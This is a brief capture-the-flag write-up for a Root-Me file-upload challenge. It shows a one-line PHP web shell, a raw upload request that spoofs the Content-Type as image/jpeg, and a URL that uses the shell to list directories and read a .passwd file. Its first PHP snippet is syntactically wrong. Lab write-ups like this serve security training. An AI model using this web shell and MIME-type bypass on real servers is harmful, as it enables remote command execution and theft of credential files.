# File upload - MIME type

web\_sh.php

```
<?php
    system($_GET(cmd))
?>
```

\->

Request

```
POST /web-serveur/ch21/?action=upload HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3117184950153127317638401
Content-Length: 252
Origin: http://challenge01.root-me.org
Connection: close
Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
Cookie: PHPSESSID=6f43055abfcaa2ddeb259bf3a62dd8ee; _ga_SRYSKX09J7=GS1.1.1661768094.26.1.1661768693.0.0.0; _ga=GA1.1.536088429.1661133467
Upgrade-Insecure-Requests: 1

-----------------------------3117184950153127317638401
Content-Disposition: form-data; name="file"; filename="web_sh.php"
Content-Type: application/x-php

<?php
    system($_GET[cmd]);
?>

-----------------------------3117184950153127317638401--
```

\->

modifying

Content-Type: application/x-php

to

Content-Type: image/jpeg

\->

then file is uploaded

\->

http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/6f43055abfcaa2ddeb259bf3a62dd8ee//web\_sh.php?cmd=ls%20-la%20../../../%20;%20cat%20../../../.passwd

then get parameter cmd takes this value.
